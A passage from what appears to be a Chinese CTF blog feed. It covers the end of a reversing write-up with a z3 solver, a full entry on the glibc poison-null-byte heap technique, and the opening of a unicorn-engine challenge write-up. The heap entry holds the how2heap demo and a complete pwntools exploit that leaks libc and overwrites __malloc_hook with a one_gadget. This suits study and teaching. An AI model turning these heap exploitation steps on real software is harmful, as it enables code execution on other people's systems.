j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>                pArray0[i][j] ^= pIv[i][j];<br>            &#125;<br>        &#125;<br>        convertArrayToStr(pArray0, &amp;p[<span class="hljs-number">0</span>]);<br>        convertArrayToStr(pArray1, &amp;p[<span class="hljs-number">16</span>]);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>解密目标数据得到: Meaningless_!$!%*@^%#%_Code 字符串</p><p>C#层还有一个 code 计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>flag2 = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;Meaningless_!$!%*@^%#%_Code&#x27;</span>)<br><span class="hljs-built_in">id</span> = [BitVec(<span class="hljs-string">&#x27;a%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>fuckId = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">id</span>]<br>tt = <span class="hljs-built_in">bytearray</span>(target)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag2)):<br>    <span class="hljs-built_in">id</span>[j % <span class="hljs-built_in">len</span>(target)] ^= flag2[j % <span class="hljs-built_in">len</span>(flag2)]<br><br>s = Solver()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    s.add(<span class="hljs-built_in">id</span>[i] == target[i])<br><br>s.check()<br>res = s.model()<br>id_ = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    id_ += <span class="hljs-built_in">chr</span>(res[fuckId[i]].as_long())<br>print(id_)<br></code></pre></td></tr></table></figure><p>最后组合得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>AES</tag>
      
      <tag>AntiDebug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>poison null byte</title>
    <link href="/2021/06/23/poison-null-byte/"/>
    <url>/2021/06/23/poison-null-byte/</url>
    
    <content type="html"><![CDATA[<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison null byte"></a>poison null byte</h1><p>off by null 改小已经释放的 chunk 的 size 域，而该 chunk 的物理下一个 chunk 的 prev_size 域没有被修改。</p><p>当前 chunk 的 size 域被改小，意味着定位下一个 chunk 会出问题，无法正确修改原来物理相邻 chunk 的 prev_size 域，释放原来物理相邻 chunk ，利用合并机制产生堆叠。</p><img src="/2021/06/23/poison-null-byte/image-20210623103530164.png" class="" title="image-20210623103530164"><p>如图 chunk a 存在 off by null ，释放 chunk b 并利用 off by null 修改 chunk b 的 size 域为 0x100</p><img src="/2021/06/23/poison-null-byte/image-20210623103811398.png" class="" title="image-20210623103811398"><p>现在，chunk b 已经被修改成 0x100 大小的 chunk，并且 chunk b 在 unsorted bin 中。</p><p>接下来在 chunk b 中分配两个 chunk 分别是： chunkB1 与 chunkB2，释放 chunkB1，最后释放 chunk c。</p><p>释放 chunk c 时，chunkB1 越过 chunk B2 与 chunk c 合并成一个大 chunk，分配出该大 chunk 产生 chunk B2 重叠的 chunk。</p><p>注意 chunkB1 不能在 fastbin 中（接下来用于绕过 free(chunk c) 时的 unlink 验证）</p><p>注意 chunk b 我们要绕过一个限制：chunksize(P) != prev_size (next_chunk(P))</p><p>chunk b 的 size 被修改成 0x100，prev_size (next_chunk(chunk b)) 也要修改为 0x100</p><p>how2heap 的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><span class="hljs-keyword">uint8_t</span>* a;<br><span class="hljs-keyword">uint8_t</span>* b;<br><span class="hljs-keyword">uint8_t</span>* c;<br><span class="hljs-keyword">uint8_t</span>* b1;<br><span class="hljs-keyword">uint8_t</span>* b2;<br><span class="hljs-keyword">uint8_t</span>* d;<br><span class="hljs-keyword">void</span> *barrier;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br>a = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><span class="hljs-keyword">int</span> real_a_size = malloc_usable_size(a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);<br><br><span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"> * the amount requested plus some amount required for the metadata. */</span><br>b = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>c = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><span class="hljs-keyword">uint64_t</span>* b_size_ptr = (<span class="hljs-keyword">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br>*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><span class="hljs-built_in">free</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><span class="hljs-comment">// will detect the heap corruption now.</span><br><span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>*((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(b1);<br><span class="hljs-built_in">free</span>(c);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br>assert(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PlaidDB"><a href="#PlaidDB" class="headerlink" title="PlaidDB"></a>PlaidDB</h2><p>利用 poison null byte ，泄漏libc地址，构造 fake fastbin 到 __malloc_hook - 0x23</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br>targetBin = <span class="hljs-string">&#x27;./datastore&#x27;</span><br>elf = ELF(targetBin)<br>libc = ELF(libc_file_name)<br><br>p = process([ld_file_name, targetBin],<br>    env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_file_name&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GET</span>(<span class="hljs-params">key</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter row key:\n&#x27;</span>, key)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PUT</span>(<span class="hljs-params">key, size, value</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;PUT&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter row key:\n&#x27;</span>, key)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter data size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Enter data:\n&#x27;</span>, value)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DEL</span>(<span class="hljs-params">key</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;DEL&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter row key:\n&#x27;</span>, key)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DUMP</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;DUMP&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">EXIT</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;EXIT&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    PUT(<span class="hljs-built_in">str</span>(i), <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    DEL(<span class="hljs-built_in">str</span>(i))<br><br><br>PUT(<span class="hljs-string">&#x27;key1&#x27;</span>, <span class="hljs-number">0x71</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x71</span>)<br>PUT(<span class="hljs-string">&#x27;key2&#x27;</span>, <span class="hljs-number">0x100</span>, (<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">128</span> + p64(<span class="hljs-number">0x90</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x100</span> - <span class="hljs-number">0x88</span>))<br>PUT(<span class="hljs-string">&#x27;key3&#x27;</span>, <span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x90</span>)<br>PUT(<span class="hljs-string">&#x27;keyD&#x27;</span>, <span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;D&#x27;</span> * <span class="hljs-number">0x90</span>) <span class="hljs-comment"># top</span><br><br>DEL(<span class="hljs-string">&#x27;key1&#x27;</span>)<br>DEL(<span class="hljs-string">&#x27;key2&#x27;</span>)<br><br>PUT(<span class="hljs-string">&#x27;E&#x27;</span> * <span class="hljs-number">0x78</span>, <span class="hljs-number">0x11</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">0x11</span>)<br><br>PUT(<span class="hljs-string">&#x27;key4&#x27;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;\xAA&#x27;</span> * <span class="hljs-number">0x80</span>)<br>PUT(<span class="hljs-string">&#x27;key5&#x27;</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\xCC&#x27;</span> * <span class="hljs-number">0x60</span>) <span class="hljs-comment">#hhh</span><br><br><span class="hljs-comment"># overlap</span><br>DEL(<span class="hljs-string">&#x27;key4&#x27;</span>)<br>DEL(<span class="hljs-string">&#x27;key3&#x27;</span>)<br><br><span class="hljs-comment"># leak</span><br>PUT(<span class="hljs-string">&#x27;key6&#x27;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;\xBB&#x27;</span> * <span class="hljs-number">0x80</span>)<br>GET(<span class="hljs-string">&#x27;key5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;:\n&quot;</span>)<br>leak_raw = u64(p.recvn(<span class="hljs-number">8</span>))<br>print(<span class="hljs-string">&quot;leak raw:&quot;</span>, <span class="hljs-built_in">hex</span>(leak_raw))<br>libc_base = leak_raw - <span class="hljs-number">0x39bb78</span><br>print(<span class="hljs-string">&quot;leak libc:&quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># one_gadget</span><br>one_gadget = libc_base + <span class="hljs-number">0xd5bf7</span><br>malloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>realloc_off = <span class="hljs-number">0x9</span><br>target_fastbin = malloc_hook - <span class="hljs-number">0x23</span><br><br>print(<span class="hljs-string">&quot;one gadget:&quot;</span>, <span class="hljs-built_in">hex</span>(one_gadget))<br>print(<span class="hljs-string">&quot;relloc_hook:&quot;</span>, <span class="hljs-built_in">hex</span>(realloc_hook))<br>print(<span class="hljs-string">&quot;malloc_hook:&quot;</span>, <span class="hljs-built_in">hex</span>(malloc_hook))<br><br>fake_chunk  = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">b&#x27;\x99&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x20</span>)<br>fake_chunk2 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(target_fastbin) +<span class="hljs-string">b&#x27;\x99&#x27;</span> * <span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x20</span>)<br>DEL(<span class="hljs-string">&#x27;key6&#x27;</span>)<br>PUT(<span class="hljs-string">&#x27;key8&#x27;</span>, <span class="hljs-built_in">len</span>(fake_chunk), fake_chunk)<br>DEL(<span class="hljs-string">&#x27;key5&#x27;</span>)<br>DEL(<span class="hljs-string">&#x27;key8&#x27;</span>)<br>PUT(<span class="hljs-string">&#x27;key8&#x27;</span>, <span class="hljs-built_in">len</span>(fake_chunk2), fake_chunk2)<br><span class="hljs-comment"># malloc_hook in fastbin</span><br><span class="hljs-comment"># &#x27;A&#x27; * 0xB, realloc_hook, malloc_hook</span><br>fake_chunk3 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xB</span> + p64(one_gadget) + p64(realloc_hook + realloc_off)<br>PUT(<span class="hljs-string">&#x27;key9&#x27;</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x60</span>)<br>PUT(<span class="hljs-string">&#x27;key10&#x27;</span>, <span class="hljs-number">0x60</span>, fake_chunk3.ljust(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;A&#x27;</span>))<br><span class="hljs-comment"># gdb.attach(p, &#x27;b *&#x27; + hex(one_gadget))</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;PUT&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>heap</tag>
      
      <tag>overlap</tag>
      
      <tag>poison_null_byte</tag>
      
      <tag>off_by_null</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯: unicorn_like_a_pro</title>
    <link href="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/"/>
    <url>/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯-unicorn-like-a-pro"><a href="#强网杯-unicorn-like-a-pro" class="headerlink" title="强网杯: unicorn_like_a_pro"></a>强网杯: unicorn_like_a_pro</h1><p>unicorn framework 是一个基于 qemu 的模拟执行框架</p><p>GitHub链接: <a href="https://github.com/unicorn-engine/unicorn">https://github.com/unicorn-engine/unicorn</a></p><p>这道题目内部就调用了 unicorn 框架模拟执行一段 x64代码，最开始以为出题人魔改了 unicorn 框架，用 bindiff 分析了一段时间，发现并没有魔改 unicorn 代码</p><p>附件 原题 &amp; 脚本 &amp; idb: <a href="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/unicorn_idb_bin.zip" title="unicorn_idb_bin.zip">unicorn_idb_bin.zip</a></p><h2 id="1-符号还原"><a href="#1-符号还原" class="headerlink" title="1. 符号还原"></a>1. 符号还原</h2><p>本题没有符号，逆向时比较困难，用 bindiff 可以直接还原。</p><p>在 ubuntu 上编译一份 unicorn 代码，载入 bindiff 插件即可完成大部分符号还原。</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613213557547.png" class="" title="image-20210613213557547"><p>IDA 中的 bindiff 插件，载入另外一份 idb 后，按下 Ctrl + 6, 点击 如下按钮，设置好阀值后即可导入符号</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613213709484.png" class="" 